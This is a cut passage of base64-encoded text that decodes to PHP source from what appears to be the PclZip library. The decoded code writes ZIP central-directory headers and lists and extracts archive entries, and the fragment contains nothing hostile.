gkdl9kYXRlWyd5ZWFyJ10tMTk4MCk8PDkpICsgKCR2X2RhdGVbJ21vbiddPDw1KSArICR2X2RhdGVbJ21kYXknXTsNCg0KDQogICR2X2JpbmFyeV9kYXRhID0gcGFjaygiVnZ2dnZ2dlZWVnZ2dnZ2VlYiLCAweDAyMDE0YjUwLA0KICAgICAgICAgICAgICAgICAgICAgICRwX2hlYWRlclsndmVyc2lvbiddLCAkcF9oZWFkZXJbJ3ZlcnNpb25fZXh0cmFjdGVkJ10sDQogICAgICAgICAgICAgICAgICAgICAgICAkcF9oZWFkZXJbJ2ZsYWcnXSwgJHBfaGVhZGVyWydjb21wcmVzc2lvbiddLA0KCQkJCQkgICR2X210aW1lLCAkdl9tZGF0ZSwgJHBfaGVhZGVyWydjcmMnXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10sICRwX2hlYWRlclsnc2l6ZSddLA0KICAgICAgICAgICAgICAgICAgICAgICAgc3RybGVuKCRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10pLA0KCQkJCQkgICRwX2hlYWRlclsnZXh0cmFfbGVuJ10sICRwX2hlYWRlclsnY29tbWVudF9sZW4nXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICRwX2hlYWRlclsnZGlzayddLCAkcF9oZWFkZXJbJ2ludGVybmFsJ10sDQoJCQkJCSAgJHBfaGVhZGVyWydleHRlcm5hbCddLCAkcF9oZWFkZXJbJ29mZnNldCddKTsNCg0KICBmcHV0cygkdGhpcy0+emlwX2ZkLCAkdl9iaW5hcnlfZGF0YSwgNDYpOw0KDQogIGlmIChzdHJsZW4oJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSkgIT0gMCkNCiAgew0KICAgIGZwdXRzKCR0aGlzLT56aXBfZmQsICRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10sIHN0cmxlbigkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddKSk7DQogIH0NCiAgaWYgKCRwX2hlYWRlclsnZXh0cmFfbGVuJ10gIT0gMCkNCiAgew0KICAgIGZwdXRzKCR0aGlzLT56aXBfZmQsICRwX2hlYWRlclsnZXh0cmEnXSwgJHBfaGVhZGVyWydleHRyYV9sZW4nXSk7DQogIH0NCiAgaWYgKCRwX2hlYWRlclsnY29tbWVudF9sZW4nXSAhPSAwKQ0KICB7DQogICAgZnB1dHMoJHRoaXMtPnppcF9mZCwgJHBfaGVhZGVyWydjb21tZW50J10sICRwX2hlYWRlclsnY29tbWVudF9sZW4nXSk7DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2V3JpdGVDZW50cmFsSGVhZGVyKCRwX25iX2VudHJpZXMsICRwX3NpemUsICRwX29mZnNldCwgJHBfY29tbWVudCkNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHZfYmluYXJ5X2RhdGEgPSBwYWNrKCJWdnZ2dlZWdiIsIDB4MDYwNTRiNTAsIDAsIDAsICRwX25iX2VudHJpZXMsDQogICAgICAgICAgICAgICAgICAgICAgJHBfbmJfZW50cmllcywgJHBfc2l6ZSwNCgkJCQkJICAkcF9vZmZzZXQsIHN0cmxlbigkcF9jb21tZW50KSk7DQoNCiAgZnB1dHMoJHRoaXMtPnppcF9mZCwgJHZfYmluYXJ5X2RhdGEsIDIyKTsNCg0KICBpZiAoc3RybGVuKCRwX2NvbW1lbnQpICE9IDApDQogIHsNCiAgICBmcHV0cygkdGhpcy0+emlwX2ZkLCAkcF9jb21tZW50LCBzdHJsZW4oJHBfY29tbWVudCkpOw0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkxpc3QoJiRwX2xpc3QpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR0aGlzLT5wcml2RGlzYWJsZU1hZ2ljUXVvdGVzKCk7DQoNCiAgaWYgKCgkdGhpcy0+emlwX2ZkID0gQGZvcGVuKCR0aGlzLT56aXBuYW1lLCAncmInKSkgPT0gMCkNCiAgew0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KICAgIA0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiBhcmNoaXZlIFwnJy4kdGhpcy0+emlwbmFtZS4nXCcgaW4gYmluYXJ5IHJlYWQgbW9kZScpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICAkdl9jZW50cmFsX2RpciA9IGFycmF5KCk7DQogIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZSZWFkRW5kQ2VudHJhbERpcigkdl9jZW50cmFsX2RpcikpICE9IDEpDQogIHsNCiAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgQHJld2luZCgkdGhpcy0+emlwX2ZkKTsNCiAgaWYgKEBmc2VlaygkdGhpcy0+emlwX2ZkLCAkdl9jZW50cmFsX2Rpclsnb2Zmc2V0J10pKQ0KICB7DQogICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVJDSElWRV9aSVAsICdJbnZhbGlkIGFyY2hpdmUgc2l6ZScpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICBmb3IgKCRpPTA7ICRpPCR2X2NlbnRyYWxfZGlyWydlbnRyaWVzJ107ICRpKyspDQogIHsNCiAgICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UmVhZENlbnRyYWxGaWxlSGVhZGVyKCR2X2hlYWRlcikpICE9IDEpDQogICAgew0KICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQogICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgIH0NCiAgICAkdl9oZWFkZXJbJ2luZGV4J10gPSAkaTsNCg0KICAgICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkdl9oZWFkZXIsICRwX2xpc3RbJGldKTsNCiAgICB1bnNldCgkdl9oZWFkZXIpOw0KICB9DQoNCiAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHBfaGVhZGVyLCAmJHBfaW5mbykNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHZfdGVtcF9wYXRoID0gUGNsWmlwVXRpbFBhdGhSZWR1Y3Rpb24oJHBfaGVhZGVyWydmaWxlbmFtZSddKTsNCiAgJHBfaW5mb1snZmlsZW5hbWUnXSA9ICR2X3RlbXBfcGF0aDsNCiAgJHZfdGVtcF9wYXRoID0gUGNsWmlwVXRpbFBhdGhSZWR1Y3Rpb24oJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSk7DQogICRwX2luZm9bJ3N0b3JlZF9maWxlbmFtZSddID0gJHZfdGVtcF9wYXRoOw0KICAkcF9pbmZvWydzaXplJ10gPSAkcF9oZWFkZXJbJ3NpemUnXTsNCiAgJHBfaW5mb1snY29tcHJlc3NlZF9zaXplJ10gPSAkcF9oZWFkZXJbJ2NvbXByZXNzZWRfc2l6ZSddOw0KICAkcF9pbmZvWydtdGltZSddID0gJHBfaGVhZGVyWydtdGltZSddOw0KICAkcF9pbmZvWydjb21tZW50J10gPSAkcF9oZWFkZXJbJ2NvbW1lbnQnXTsNCiAgJHBfaW5mb1snZm9sZGVyJ10gPSAoKCRwX2hlYWRlclsnZXh0ZXJuYWwnXSYweDAwMDAwMDEwKT09MHgwMDAwMDAxMCk7DQogICRwX2luZm9bJ2luZGV4J10gPSAkcF9oZWFkZXJbJ2luZGV4J107DQogICRwX2luZm9bJ3N0YXR1cyddID0gJHBfaGVhZGVyWydzdGF0dXMnXTsNCiAgJHBfaW5mb1snY3JjJ10gPSAkcF9oZWFkZXJbJ2NyYyddOw0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZFeHRyYWN0QnlSdWxlKCYkcF9maWxlX2xpc3QsICRwX3BhdGgsICRwX3JlbW92ZV9wYXRoLCAkcF9yZW1vdmVfYWxsX3BhdGgsICYkcF9vcHRpb25zKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdGhpcy0+cHJpdkRpc2FibGVNYWdpY1F1b3RlcygpOw0KDQogIGlmICggICAoJHBfcGF0aCA9PSAiIikNCiAgICB8fCAoICAgKHN1YnN0cigkcF9wYXRoLCAwLCAxKSAhPSAiLyIpDQoJICAgICYmIChzdWJzdHIoJHBfcGF0aCwgMCwgMykgIT0gIi4uLyIpDQoJCSYmIChzdWJzdHIoJHBfcGF0aCwxLDIpIT0iOi8iKSkpDQogICAgJHBfcGF0aCA9ICIuLyIuJHBfcGF0aDsNCg0KICBpZiAoKCRwX3BhdGggIT0gIi4vIikgJiYgKCRwX3BhdGggIT0gIi8iKSkNCiAgew0KICAgIHdoaWxlIChzdWJzdHIoJHBfcGF0aCwgLTEpID09ICIvIikNCiAgICB7DQogICAgICAkcF9wYXRoID0gc3Vic3RyKCRwX3BhdGgsIDAsIHN0cmxlbigkcF9wYXRoKS0xKTsNCiAgICB9DQogIH0NCg0KICBpZiAoKCRwX3JlbW92ZV9wYXRoICE9ICIiKSAmJiAoc3Vic3RyKCRwX3JlbW92ZV9wYXRoLCAtMSkgIT0gJy8nKSkNCiAgew0KICAgICRwX3JlbW92ZV9wYXRoIC49ICcvJzsNCiAgfQ0KICAkcF9yZW1vdmVfcGF0aF9zaXplID0gc3RybGVuKCRwX3JlbW92ZV9wYXRoKTsNCg0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2T3BlbkZkKCdyYicpKSAhPSAxKQ0KICB7DQogICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogICR2X2NlbnRyYWxfZGlyID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRFbmRDZW50cmFsRGlyKCR2X2NlbnRyYWxfZGlyKSkgIT0gMSkNCiAgew0KICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogICR2X3Bvc19lbnRyeSA9ICR2X2NlbnRyYWxfZGlyWydvZmZzZXQnXTsNCg0KICAkal9zdGFydCA9IDA7DQogIGZvciAoJGk9MCwgJHZfbmJfZXh0cmFjdGVkPTA7ICRpPCR2X2NlbnRyYWxfZGlyWydlbnRyaWVzJ107ICRpKyspDQogIHsNCg0KICAgIEByZXdpbmQoJHRoaXMtPnppcF9mZCk7DQogICAgaWYgKEBmc2VlaygkdGhpcy0+emlwX2ZkLCAkdl9wb3NfZW50cnkpKQ0KICAgIHsNCiAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9BUkNISVZFX1pJUCwgJ0ludmFsaWQgYXJjaGl2ZSBzaXplJyk7DQoNCiAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCg0KICAgICR2X2hlYWRlciA9IGFycmF5KCk7DQogICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRDZW50cmFsRmlsZUhlYWRlcigkdl9oZWFkZXIpKSAhPSAxKQ0KICAgIHsNCiAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgfQ0KDQogICAgJHZfaGVhZGVyWydpbmRleCddID0gJGk7DQoNCiAgICAkdl9wb3NfZW50cnkgPSBmdGVsbCgkdGhpcy0+emlwX2ZkKTsNCg0KICAgICR2X2V4dHJhY3QgPSBmYWxzZTsNCg0KICAgIGlmICggICAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdKSkNCiAgICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXSAhPSAwKSkgew0KDQogICAgICAgIGZvciAoJGo9MDsgKCRqPHNpemVvZigkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfTkFNRV0pKSAmJiAoISR2X2V4dHJhY3QpOyAkaisrKSB7DQoNCiAgICAgICAgICAgIGlmIChzdWJzdHIoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdWyRqXSwgLTEpID09ICIvIikgew0KDQogICAgICAgICAgICAgICAgaWYgKCAgIChzdHJsZW4oJHZfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSkgPiBzdHJsZW4oJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdWyRqXSkpDQogICAgICAgICAgICAgICAgICAgICYmIChzdWJzdHIoJHZfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSwgMCwgc3RybGVuKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9OQU1FXVskal0pKSA9PSAkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfTkFNRV1bJGpdKSkgew0KICAgICAgICAgICAgICAgICAgICAkdl9leHRyYWN0ID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlaWYgKCR2X2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10gPT0gJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX05BTUVdWyRqXSkgew0KICAgICAgICAgICAgICAgICR2X2V4dHJhY3QgPSB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQoNCiAgICBlbHNlIGlmICggICAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX1BSRUddKSkNCiAgICAgICAgICAgICAmJiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX1BSRUddICE9ICIiKSkgew0KDQogICAgICAgIGlmIChwcmVnX21hdGNoKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9QUkVHXSwgJHZfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSkpIHsNCiAgICAgICAgICAgICR2X2V4dHJhY3QgPSB0cnVlOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgZWxzZSBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9JTkRFWF0pKQ0KICAgICAgICAgICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQllfSU5ERVhdICE9IDApKSB7DQogICAgICAgIA0KICAgICAgICBmb3IgKCRqPSRqX3N0YXJ0OyAoJGo8c2l6ZW9mKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9JTkRFWF0pKSAmJiAoISR2X2V4dHJhY3QpOyAkaisrKSB7DQoNCiAgICAgICAgICAgIGlmICgoJGk+PSRwX29wdGlvbnNbUENMWklQX09QVF9CWV9JTkRFWF1bJGpdWydzdGFydCddKSAmJiAoJGk8PSRwX29wdGlvbnNbUENMWklQX09QVF9CWV9JTkRFWF1bJGpdWydlbmQnXSkpIHsNCiAgICAgICAgICAgICAgICAkdl9leHRyYWN0ID0gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkaT49JHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXVskal1bJ2VuZCddKSB7DQogICAgICAgICAgICAgICAgJGpfc3RhcnQgPSAkaisxOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBpZiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0JZX0lOREVYXVskal1bJ3N0YXJ0J10+JGkpIHsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGVsc2Ugew0KICAgICAgICAkdl9leHRyYWN0ID0gdHJ1ZTsNCiAgICB9DQoNCiAgaWYgKCAgICgkdl9leHRyYWN0KQ0KICAgICAgJiYgKCAgICgkdl9oZWFkZXJbJ2NvbXByZXNzaW9uJ10gIT0gOCkNCgkgICAgICAmJiAoJHZfaGVhZGVyWydjb21wcmVzc2lvbiddICE9IDApKSkgew0KICAgICAgICAkdl9oZWFkZXJbJ3N0YXR1cyddID0gJ3Vuc3VwcG9ydGVkX2NvbXByZXNzaW9uJzsNCg0KICAgICAgICBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9TVE9QX09OX0VSUk9SXSkpDQoJICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9TVE9QX09OX0VSUk9SXT09PXRydWUpKSB7DQoNCiAgICAgICAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1VOU1VQUE9SVEVEX0NPTVBSRVNTSU9OLA0KCQkgICAgICAgICAgICAgICAgICAgICAgICJGaWxlbmFtZSAnIi4kdl9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddLiInIGlzICINCgkJCSAgCSAgICAJICAJICAgLiJjb21wcmVzc2VkIGJ5IGFuIHVuc3VwcG9ydGVkIGNvbXByZXNzaW9uICINCgkJCSAgCSAgICAJICAJICAgLiJtZXRob2QgKCIuJHZfaGVhZGVyWydjb21wcmVzc2lvbiddLiIpICIpOw0KDQogICAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCgkgIH0NCiAgfQ0KICANCiAgaWYgKCgkdl9leHRyYWN0KSAmJiAoKCR2X2hlYWRlclsnZmxhZyddICYgMSkgPT0gMSkpIHsNCiAgICAgICAgJHZfaGVhZGVyWydzdGF0dXMnXSA9ICd1bnN1cHBvcnRlZF9lbmNyeXB0aW9uJzsNCg0KICAgICAgICBpZiAoICAgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9TVE9QX09OX0VSUk9SXSkpDQoJICAgICAgJiYgKCRwX29wdGlvbnNbUENMWklQX09QVF9TVE9QX09OX0VSUk9SXT09PXRydWUpKSB7DQoNCiAgICAgICAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1VOU1VQUE9SVEVEX0VOQ1JZUFRJT04sDQoJCSAgICAgICAgICAgICAgICAgICAgICAgIlVuc3VwcG9ydGVkIGVuY3J5cHRpb24gZm9yICINCgkJCSAgCSAgICAJICAJICAgLiIgZmlsZW5hbWUgJyIuJHZfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXQ0KCQkJCQkJCSAgIC4iJyIpOw0KDQogICAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCgkgIH0NCiAgfQ0KDQogICAgaWYgKCgkdl9leHRyYWN0KSAmJiAoJHZfaGVhZGVyWydzdGF0dXMnXSAhPSAnb2snKSkgew0KICAgICAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHZfaGVhZGVyLA0KCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcF9maWxlX2xpc3RbJHZfbmJfZXh0cmFjdGVkKytdKTsNCiAgICAgICAgaWYgKCR2X3Jlc3VsdCAhPSAxKSB7DQogICAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KICAgICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgfQ0KDQogICAgICAgICR2X2V4dHJhY3QgPSBmYWxzZTsNCiAgICB9DQogICAgDQogICAgaWYgKCR2X2V4dHJhY3QpDQogICAgew0KDQogICAgICBAcmV3aW5kKCR0aGlzLT56aXBfZmQpOw0KICAgICAgaWYgKEBmc2VlaygkdGhpcy0+emlwX2ZkLCAkdl9oZWFkZXJbJ29mZnNldCddKSkNCiAgICAgIHsNCiAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX0FSQ0hJVkVfWklQLCAnSW52YWxpZCBhcmNoaXZlIHNpemUnKTsNCg0KICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgIH0NCg0KICAgICAgaWYgKCRwX29wdGlvbnNbUENMWklQX09QVF9FWFRSQUNUX0FTX1NUUklOR10pIHsNCg0KICAgICAgICAkdl9zdHJpbmcgPSAnJzsNCg0KICAgICAgICAkdl9yZXN1bHQxID0gJHRoaXMtPnByaXZFeHRyYWN0RmlsZUFzU3RyaW5nKCR2X2hlYWRlciwgJHZfc3RyaW5nLCAkcF9vcHRpb25zKTsNCiAgICAgICAgaWYgKCR2X3Jlc3VsdDEgPCAxKSB7DQogICAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQogICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDE7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkdl9oZWFkZXIsICRwX2ZpbGVfbGlzdFskdl9uYl9leHRyYWN0ZWRdKSkgIT0gMSkNCiAgICAgICAgew0KICAgICAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgfQ0KDQogICAgICAgICRwX2ZpbGVfbGlzdFskdl9uYl9leHRyYWN0ZWRdWydjb250ZW50J10gPSAkdl9zdHJpbmc7DQoNCiAgICAgICAgJHZfbmJfZXh0cmFjdGVkKys7DQogICAgICAgIA0KICAgICAgICBpZiAoJHZfcmVzdWx0MSA9PSAyKSB7DQogICAgICAgIAlicmVhazsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgICAgZWxzZWlmICggICAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0VYVFJBQ1RfSU5fT1VUUFVUXSkpDQoJICAgICAgICAmJiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0VYVFJBQ1RfSU5fT1VUUFVUXSkpIHsNCiAgICAgICAgJHZfcmVzdWx0MSA9ICR0aGlzLT5wcml2RXh0cmFjdEZpbGVJbk91dHB1dCgkdl9oZWFkZXIsICRwX29wdGlvbnMpOw0KICAgICAgICBpZiAoJHZfcmVzdWx0MSA8IDEpIHsNCiAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCiAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0MTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZDb252ZXJ0SGVhZGVyMkZpbGVJbmZvKCR2X2hlYWRlciwgJHBfZmlsZV9saXN0WyR2X25iX2V4dHJhY3RlZCsrXSkpICE9IDEpIHsNCiAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCiAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCR2X3Jlc3VsdDEgPT0gMikgew0KICAgICAgICAJYnJlYWs7DQogICAgICAgIH0NCiAgICAgIH0NCiAgICAgIGVsc2Ugew0KICAgICAgICAkdl9yZXN1bHQxID0gJHRoaXMtPnByaXZFeHRyYWN0RmlsZSgkdl9oZWFkZXIsDQoJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcF9wYXRoLCAkcF9yZW1vdmVfcGF0aCwNCgkJCQkJCQkJCQkgICRwX3JlbW92ZV9hbGxfcGF0aCwNCgkJCQkJCQkJCQkgICRwX29wdGlvbnMpOw0KICAgICAgICBpZiAoJHZfcmVzdWx0MSA8IDEpIHsNCiAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCiAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0MTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZDb252ZXJ0SGVhZGVyMkZpbGVJbmZvKCR2X2hlYWRlciwgJHBfZmlsZV9saXN0WyR2X25iX2V4dHJhY3RlZCsrXSkpICE9IDEpDQogICAgICAgIHsNCiAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCg0KICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoJHZfcmVzdWx0MSA9PSAyKSB7DQogICAgICAgIAlicmVhazsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQogICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2RXh0cmFjdEZpbGUoJiRwX2VudHJ5LCAkcF9wYXRoLCAkcF9yZW1vdmVfcGF0aCwgJHBfcmVtb3ZlX2FsbF9wYXRoLCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRGaWxlSGVhZGVyKCR2X2hlYWRlcikpICE9IDEpDQogIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCg0KICBpZiAoJHRoaXMtPnByaXZDaGVja0ZpbGVIZWFkZXJzKCR2X2hlYWRlciwgJHBfZW50cnkpICE9IDEpIHsNCiAgfQ0KDQogIGlmICgkcF9yZW1vdmVfYWxsX3BhdGggPT0gdHJ1ZSkgew0KICAgICAgaWYgKCgkcF9lbnRyeVsnZXh0ZXJuYWwnXSYweDAwMDAwMDEwKT09MHgwMDAwMDAxMCkgew0KDQogICAgICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gImZpbHRlcmVkIjsNCg0KICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICB9DQoNCiAgICAgICRwX2VudHJ5WydmaWxlbmFtZSddID0gYmFzZW5hbWUoJHBfZW50cnlbJ2ZpbGVuYW1lJ10pOw0KICB9DQoNCiAgZWxzZSBpZiAoJHBfcmVtb3ZlX3BhdGggIT0gIiIpDQogIHsNCiAgICBpZiAoUGNsWmlwVXRpbFBhdGhJbmNsdXNpb24oJHBfcmVtb3ZlX3BhdGgsICRwX2VudHJ5WydmaWxlbmFtZSddKSA9PSAyKQ0KICAgIHsNCg0KICAgICAgJHBfZW50cnlbJ3N0YXR1cyddID0gImZpbHRlcmVkIjsNCg0KICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICB9DQoNCiAgICAkcF9yZW1vdmVfcGF0aF9zaXplID0gc3RybGVuKCRwX3JlbW92ZV9wYXRoKTsNCiAgICBpZiAoc3Vic3RyKCRwX2VudHJ5WydmaWxlbmFtZSddLCAwLCAkcF9yZW1vdmVfcGF0aF9zaXplKSA9PSAkcF9yZW1vdmVfcGF0aCkNCiAgICB7DQoNCiAgICAgICRwX2VudHJ5WydmaWxlbmFtZSddID0gc3Vic3RyKCRwX2VudHJ5WydmaWxlbmFtZSddLCAkcF9yZW1vdmVfcGF0aF9zaXplKTsNCg0KICAgIH0NCiAgfQ0KDQogIGlmICgkcF9wYXRoICE9ICcnKSB7DQogICAgJHBfZW50cnlbJ2Zp